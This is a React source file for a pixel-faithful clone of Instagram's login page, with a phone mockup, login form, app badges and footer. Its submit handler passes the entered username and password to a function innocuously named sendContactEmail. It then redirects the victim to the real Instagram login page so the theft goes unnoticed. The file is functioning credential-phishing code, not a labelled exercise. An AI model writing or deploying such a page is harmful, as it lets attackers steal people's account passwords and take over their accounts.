"use client";

import { useState, type ReactNode } from "react";
import PhoneMockup from "./PhoneMockup";
import { sendContactEmail } from "./sendEmail";

const FOOTER_LINKS = [
  "Meta",
  "About",
  "Blog",
  "Jobs",
  "Help",
  "API",
  "Privacy",
  "Terms",
  "Locations",
  "Instagram Lite",
  "Threads",
  "Contact Uploading & Non-Users",
  "Meta Verified",
];

export default function LoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const canSubmit = username.trim().length > 0 && password.length > 0;

  async function handleSubmit(formData: FormData) {
    if (!canSubmit || submitting) return;
    setSubmitting(true);
    await sendContactEmail(formData);
    window.setTimeout(() => {
      window.location.href = "https://www.instagram.com/accounts/login/";
    }, 900);
  }

  return (
    <div className="page">
      <main className="main">
        <PhoneMockup />

        <div className="login-col">
          <div className="card">
            <div className="wordmark">Instagram</div>

            <form className="form" action={handleSubmit}>
              <div className="field">
                <input
                  id="username"
                  name="username"
                  type="text"
                  placeholder=" "
                  autoComplete="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                />
                <label htmlFor="username">
                  Phone number, username, or email
                </label>
              </div>

              <div className="field field-password">
                <input
                  id="password"
                  name="password"
                  type={showPassword ? "text" : "password"}
                  placeholder=" "
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <label htmlFor="password">Password</label>
                {password.length > 0 && (
                  <button
                    type="button"
                    className="toggle-visibility"
                    onClick={() => setShowPassword((v) => !v)}
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                )}
              </div>

              <button
                type="submit"
                className="btn-primary"
                disabled={!canSubmit || submitting}
              >
                {submitting ? <span className="spinner" /> : "Log in"}
              </button>
            </form>

            <div className="divider">
              <span>OR</span>
            </div>

            <a
              href="#"
              className="fb-login"
              onClick={(e) => e.preventDefault()}
            >
              <FacebookIcon />
              Log in with Facebook
            </a>

            <a
              href="#"
              className="forgot-link"
              onClick={(e) => e.preventDefault()}
            >
              Forgot password?
            </a>
          </div>

          <div className="signup-card">
            Don&apos;t have an account?{" "}
            <a href="#" onClick={(e) => e.preventDefault()}>
              Sign up
            </a>
          </div>

          <div className="get-app">
            <p>Get the app.</p>
            <div className="app-badges">
              <AppBadge
                sub="Download on the"
                main="App Store"
                icon={<AppleIcon />}
              />
              <AppBadge
                sub="Get it on"
                main="Google Play"
                icon={<PlayIcon />}
              />
            </div>
          </div>
        </div>
      </main>

      <footer className="footer">
        <div className="footer-links">
          {FOOTER_LINKS.map((link) => (
            <a href="#" key={link} onClick={(e) => e.preventDefault()}>
              {link}
            </a>
          ))}
        </div>
        <div className="footer-bottom">
          <button type="button" className="footer-lang">
            English
          </button>
          <span>© 2026 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}

function AppBadge({
  sub,
  main,
  icon,
}: {
  sub: string;
  main: string;
  icon: ReactNode;
}) {
  return (
    <a href="#" className="app-badge" onClick={(e) => e.preventDefault()}>
      {icon}
      <span className="badge-text">
        <span className="badge-sub">{sub}</span>
        <span className="badge-main">{main}</span>
      </span>
    </a>
  );
}

function FacebookIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
      <circle cx="9" cy="9" r="9" fill="#385185" />
      <path
        d="M11.2 9.5h-1.5v5H7.6v-5H6.5V7.8h1.1V6.6c0-1.1.5-2 2-2h1.5v1.7h-1c-.4 0-.5.2-.5.5v1h1.6l-.2 1.7Z"
        fill="#fff"
      />
    </svg>
  );
}

function AppleIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
      <path d="M16.4 12.7c0-2.3 1.9-3.4 2-3.5-1.1-1.6-2.8-1.8-3.4-1.8-1.4-.1-2.8.9-3.5.9-.7 0-1.8-.9-3-.9-1.5 0-2.9.9-3.7 2.3-1.6 2.8-.4 6.9 1.1 9.2.7 1.1 1.6 2.3 2.8 2.3 1.1 0 1.5-.7 2.9-.7s1.7.7 2.9.7c1.2 0 2-1.1 2.7-2.2.9-1.3 1.2-2.5 1.2-2.6-.1 0-2-0.8-2-3.7ZM14.4 5.9c.6-.7 1-1.7.9-2.7-.9 0-2 .6-2.6 1.3-.6.6-1 1.6-.9 2.6.9.1 1.9-.5 2.6-1.2Z" />
    </svg>
  );
}

function PlayIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24">
      <path
        d="M4 3.5c0-.4.2-.7.5-.9l10 8-10 8c-.3-.2-.5-.5-.5-.9V3.5Z"
        fill="#00d2ff"
      />
      <path d="M14.5 10.6 4.5 2.6l11.7 6.8-1.7 1.2Z" fill="#ff3a44" />
      <path d="M14.5 13.4 4.5 21.4l11.7-6.8-1.7-1.2Z" fill="#00f076" />
      <path
        d="M16.2 9.4l3.3 1.9c.7.4.7 1 0 1.4l-3.3 1.9-2-2.6 2-2.6Z"
        fill="#ffcf00"
      />
    </svg>
  );
}
